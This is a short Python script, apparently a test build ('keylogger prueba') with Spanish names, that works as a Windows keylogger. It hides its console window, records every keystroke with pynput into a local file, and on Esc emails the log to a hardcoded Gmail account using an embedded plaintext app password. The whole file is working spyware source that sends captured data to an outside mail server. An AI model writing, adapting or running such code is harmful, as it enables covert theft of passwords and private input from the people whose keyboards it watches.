#!/usr/bin/env pyhton
#_*_ coding: utf8 _*_

import pynput.keyboard
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import win32console
import win32gui
ventana=win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana,0)

log_file=open('log.txt','w+')

def enviar_datos():
    msg=MIMEMultipart()
    password="fjkkxiqqyyfdgxqg"
    msg['From']="libre1241@gmail.com"
    msg['To']="libre1241@gmail.com"
    msg['Subject']="keylogger prueba"
    msg.attach(MIMEText(file('log.txt').read()))

    try:
        server=smtplib.SMTP('smtp.gmail.com:587')#definir el servidor de correo electronico y el puerto 
        server.starttls()
        server.login(msg['From'],password)
        server.sendmail(['From'],msg['To'],msg.as_string())
        server.quit()

    except:
        pass

def imprimir():
    teclas = ''.join(lista_tecla)
    log_file.write(teclas)
    log_file.write('\n')
    log_file.close()
    time.sleep(3)
    enviar_datos()
 
lista_tecla = []
 
def convertir(key):
    if isinstance(key,pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)
def presiona(key):
    key1 = convertir(key)
    if key1 == "Key.esc":
        print("Saliendo...")
        imprimir()
        return False
    elif key1 == "Key.space":
        lista_tecla.append(" ")
    elif key1 == "Key.enter":
        lista_tecla.append("\n")
    elif key1 == "Key.backspace":
        pass
    elif key1 == "Key.tab":
        pass
    elif key1 == "Key.shift":
        pass 
    else: 
        lista_tecla.append(key1)
with pynput.keyboard.Listener(on_press=presiona) as listen:
    listen.join()
